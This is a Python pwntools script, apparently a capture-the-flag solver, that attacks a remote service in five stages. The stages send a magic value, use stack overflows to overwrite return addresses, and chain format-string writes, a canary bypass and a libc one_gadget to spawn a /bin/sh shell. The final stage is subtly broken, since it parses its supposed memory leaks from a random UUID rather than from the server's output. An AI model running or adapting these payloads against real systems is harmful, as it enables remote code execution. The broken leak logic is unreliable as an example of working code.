from pwn import *
import time
import sys
from uuid import uuid4

def method3(ip,port):
    log.info("Method 3 applied!")
    r = remote(ip, port)

    def level1():
        r.sendline(str(252534))

    def level2():
        payload = "A" * (0x88 - 0xC)
        payload += p32(0xCC07C9)
        r.sendline(payload)

    def level3():
        goal = 0x0804862D
        payload = "A" * 0x84
        payload += "B" * 4
        payload += p32(goal)
        r.sendline(payload)

    def level4():
        goal = 0x0804A47C
        action = 73
        r.sendline(str(action))
        payload = p32(goal) * (120 / 4)
        r.sendline(payload)

    def level5():
        offset = 79
        offset2 = 105
        offset_one_gadget = 0xf1147  # execve("/bin/sh", rsp+0x70, environ)
        r.sendline("3")
        r.sendline("%71$p-%77$p-%79$p")
        res = str(uuid4()).replace("\n", "").split("-")
        canary = int(res[0], 16)
        __libc_start_main_ret = int(res[1], 16)
        stack = int(res[2], 16)
        base_libc = __libc_start_main_ret - 0x20830
        one_gadget = base_libc + offset_one_gadget

        r.sendline("3")
        payload = "%" + str((stack - 0x88) & 0xffff) + "u" + "%" + str(offset) + "$hn"
        r.sendline(payload)

        r.sendline("3")
        payload = "%" + str(offset2) + "$n"
        r.sendline(payload)

        r.sendline("3")
        payload = "%" + str((stack - 0x88 + 4) & 0xffff) + "u" + "%" + str(offset) + "$hn"
        r.sendline(payload)

        r.sendline("3")
        payload = "%" + str(offset2) + "$n"
        r.sendline(payload)

        r.sendline("1")
        payload = "A" * (0x20 - 0x8)
        payload += p64(canary)
        payload += "B" * 8
        payload += p64(one_gadget)
        payload += "\x00" * (0x40 - len(payload))
        r.send(payload)

    level1()
    level2()
    level3()
    level4()
    level5()

#if __name__=="__main__":
#    method3("127.0.0.1",80)

